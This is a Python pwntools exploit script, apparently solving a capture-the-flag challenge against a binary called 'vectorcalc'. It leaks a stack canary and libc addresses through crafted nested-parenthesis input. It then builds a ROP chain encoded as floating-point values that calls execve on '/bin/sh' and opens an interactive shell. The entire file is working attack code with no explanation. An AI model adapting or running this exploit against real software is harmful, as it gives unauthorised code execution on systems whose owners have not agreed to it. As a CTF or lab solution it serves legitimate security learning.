import binascii

from pwn import *

def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', f))[0])


message = '(' * 32 + ')' * 31


def request(conn):
    conn.sendline(message.encode())
    response = conn.recvline().decode()
    canary = response[1:response.index(',')]
    first_number = int(float(canary))
    response_arr = [double_to_hex(float(i)) for i in response[1:-2].split(', ')]
    return first_number, response_arr, canary


first_number = -1
conn = None

while first_number in [-1, 0, 1]:
    if conn:
        conn.close()
    conn = process("server/vectorcalc", env={"LD_PRELOAD": "server/libc.so.6"})
    first_number, response_arr, canary = request(conn)

def to_double_str(i):
    if not isinstance(i, str):
        i = hex(i)
    return str(struct.unpack('>d', bytes.fromhex(i[2:].zfill(16)))[0])


BINSH = to_double_str(int(response_arr[5], 16) - (0x7ffff7fc76b0 - 0x7ffff7f8c519))
POPRAX = to_double_str(int(response_arr[5], 16) - (0x7ffff7fc76b0 - 0x00007ffff7e42d30))
TORAX = to_double_str(0x3b)
POPRDXRSI = to_double_str(int(response_arr[5], 16) - (0x7ffff7fc76b0 - 0x00007ffff7f11159))
TORDX = to_double_str(0)
TORSI = to_double_str(0)
POPRDI = to_double_str(int(response_arr[5], 16) - (0x7ffff7fc76b0 - 0x00007ffff7e2bbe3))
TORDI = BINSH
SYSCALL = to_double_str(int(response_arr[5], 16) - (0x7ffff7fc76b0 - 0x00007ffff7ebf8b9))

variable = 'a=' + "{" + ",".join([POPRAX, TORAX, POPRDXRSI, TORDX, TORSI, POPRDI, TORDI, SYSCALL]) + "}"

conn.sendline(variable)

retaddr = hex(int(response_arr[1], 16) + int("0x3f8", 16))
gadget = hex(int(response_arr[5], 16) - int("0x1757e9", 16))
payload = [canary, "0x00", "0x00", "0x00", "0x00", "0x00", retaddr, gadget]

actual_payload = [payload[0]] + [to_double_str(i) for i in payload[1:]]

payload_str = "{" + ",".join(actual_payload) + "}"

conn.sendline(31 * '(' + payload_str + 31 * ')')
conn.recvline()

conn.interactive()

conn.close()